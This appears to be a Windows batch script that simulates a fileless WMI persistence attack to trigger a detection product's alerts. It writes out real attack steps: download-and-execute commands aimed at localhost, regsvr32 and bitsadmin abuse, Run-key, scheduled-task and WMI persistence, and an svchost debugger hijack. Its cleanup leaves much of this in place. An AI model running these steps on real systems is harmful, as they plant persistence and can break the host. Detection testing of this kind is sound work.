@echo off
REM WMI PERSISTENCE - Fileless Attack (No cmd.exe->PowerShell transition)
REM Pure WMI + Scheduled Task + Registry approach

set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

setlocal enabledelayedexpansion

echo ============================================
echo WMI PERSISTENCE - Fileless Attack Pattern
echo (No cmd->PowerShell chain)
echo ============================================
echo.

mkdir "%TEMP%\wmi_payload" 2>nul

mkdir "%TEMP%\argus_burst" 2>nul
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 12; $i++) { $bytes = [byte[]]::new(32768); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\argus_burst\burst_$i.exe\", $bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\argus_burst\burst_$i.dll\", $bytes) }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/payload') } catch { }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ArgusDemo' -Value \"$env:TEMP\argus_burst\burst_0.exe\" -PropertyType String -Force 2>$null"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe' -Name 'Debugger' -Value \"$env:TEMP\argus_burst\burst_1.dll\" -PropertyType String -Force 2>$null"
for /l %%i in (1,1,10) do start /min cmd.exe /c "echo argus_%%i" >nul 2>&1
start /min regsvr32.exe /s /n /u /i:http://127.0.0.1/fake.sct scrobj.dll >nul 2>&1
start /min mshta.exe javascript:close() >nul 2>&1
start /min wmic.exe process call create "cmd /c echo argus" >nul 2>&1
schtasks /create /tn "ArgusDemo" /tr "%TEMP%\argus_burst\burst_0.exe" /sc onlogon /f >nul 2>&1
bitsadmin /create ArgusDemo >nul 2>&1
bitsadmin /addfile ArgusDemo http://127.0.0.1:8080/demo "%TEMP%\argus_burst\burst_0.exe" >nul 2>&1
bitsadmin /resume ArgusDemo >nul 2>&1

REM Stage 1: Create high-entropy in-memory payloads
echo [*] Stage 1: Creating high-entropy encrypted payloads
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 35; $i++) { $bytes = [byte[]]::new(12288); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\wmi_payload\wmiprov_$i.bin\", $bytes) }"

REM Stage 2: WMI Event Filter creation (fileless execution)
echo [*] Stage 2: WMI Event Filter subscription
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command ^
"try { " ^
"  $filter = Get-WmiObject -Class __EventFilter -Namespace root\\subscription -Filter \"Name='WMIPersist1'\" -ErrorAction SilentlyContinue; " ^
"  if (!$filter) { " ^
"    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name='WMIPersist1'; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \"Win32_Process\"'}; " ^
"    Write-Host 'WMI Event Filter created'; " ^
"  } " ^
"} catch { }"

REM Stage 3: Multiple scheduled tasks (different pattern from REAL_MALWARE_1)
echo [*] Stage 3: Scheduled task persistence (Task Scheduler)
schtasks /create /tn "SystemMaintenance" /tr "%TEMP%\wmi_payload\wmiprov_0.bin" /sc onlogon /f >nul 2>&1
schtasks /create /tn "WindowsDefenderUpdate" /tr "%TEMP%\wmi_payload\wmiprov_1.bin" /sc onidle /I 10 /f >nul 2>&1
schtasks /create /tn "DailyCheck" /tr "%TEMP%\wmi_payload\wmiprov_2.bin" /sc daily /st 03:00 /f >nul 2>&1

echo [+] Created 3 scheduled tasks

REM Stage 4: Registry event handler + context menu injection
echo [*] Stage 4: Context menu injection (Explorer persistence)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.txt\UserChoice" /v "Progid" /t REG_SZ /d "%TEMP%\wmi_payload\wmiprov_0.bin" /f >nul 2>&1

REM Stage 5: Startup registry + Run key
echo [*] Stage 5: Startup registry modification
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WMIHost" /t REG_SZ /d "%TEMP%\wmi_payload\wmiprov_3.bin" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "ConfigUpdate" /t REG_SZ /d "%TEMP%\wmi_payload\wmiprov_4.bin" /f >nul 2>&1

REM Stage 6: File rapid operations (edge burst)
echo [*] Stage 6: Rapid file operations (no deletion, just rename)
for /l %%i in (1,1,35) do (
	if exist "%TEMP%\wmi_payload\wmiprov_%%i.bin" (
		ren "%TEMP%\wmi_payload\wmiprov_%%i.bin" "wmiprov_%%i.old" 2>nul
		ren "%TEMP%\wmi_payload\wmiprov_%%i.old" "wmiprov_%%i.bak" 2>nul
		ren "%TEMP%\wmi_payload\wmiprov_%%i.bak" "wmiprov_%%i.tmp" 2>nul
	)
)

echo [+] Created 105 file operations (35 × 3 renames)

REM Stage 7: BITS transfer simulation (stealthy C2)
echo [*] Stage 7: BITS job creation (stealthy data transfer)
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { New-BitsTransferJob -Name 'Update' -Source 'http://127.0.0.1:9999/data' -Destination '%TEMP%\wmi_payload\data.bin' -Suspended } catch { }" 2>nul

REM Stage 8: Task Scheduler query (persistence verification)
echo [*] Stage 8: Task Scheduler persistence verification
schtasks /query /tn "SystemMaintenance" >nul 2>&1
schtasks /query /tn "WindowsDefenderUpdate" >nul 2>&1

echo.
echo ============================================
echo WMI PERSISTENCE SIMULATION COMPLETE
echo Expected Alerts:
echo - Layer 0: HIGH ENTROPY (WMI payloads > 7.9)
echo - Layer 2A: EDGE BURST (105 file operations)
echo - Layer 2B: P-MATRIX (registry + WMI + Tasks)
echo - Layer 2C: GRAPH ANOMALY (WMI subscribers)
echo - Layer 3: FILELESS ATTACK INCIDENT
echo ============================================

REM Cleanup
timeout /t 2 /nobreak
schtasks /delete /tn "SystemMaintenance" /f >nul 2>&1
schtasks /delete /tn "WindowsDefenderUpdate" /f >nul 2>&1
schtasks /delete /tn "DailyCheck" /f >nul 2>&1
rmdir /s /q "%TEMP%\wmi_payload" 2>nul
